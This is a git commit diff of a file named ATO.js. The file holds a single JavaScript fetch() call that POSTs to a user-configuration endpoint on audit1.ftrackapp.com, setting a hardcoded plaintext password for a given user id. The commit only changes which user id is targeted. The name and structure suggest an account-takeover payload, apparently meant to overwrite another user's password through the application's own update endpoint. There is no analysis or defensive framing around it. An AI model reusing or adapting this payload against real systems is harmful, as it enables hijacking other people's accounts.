6ec570f0e08bd47eea50e47e28d6d39fbee01e4e
tomoncrss <tonymyson89823@gmail.com>
2025-02-15 15:26:46 +0330

    Update ATO.js

--- ATO.js
+++ ATO.js
@@ -1,5 +1,5 @@
 fetch("https://audit1.ftrackapp.com/configure/update", {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `data=%5B%7B%22password%22%3A%22jhjkhdHJ%4098989jhjhaa%22%2C%22userid%22%3A%229e7a3ff6-75ce-4510-8cdb-852bba9a737a%22%7D%5D&name=users`
+        body: `data=%5B%7B%22password%22%3A%22jhjkhdHJ%4098989jhjhaa%22%2C%22userid%22%3A%2273c6cfde-4f64-4750-a6c1-f7accfa9a9ba%22%7D%5D&name=users`
       });
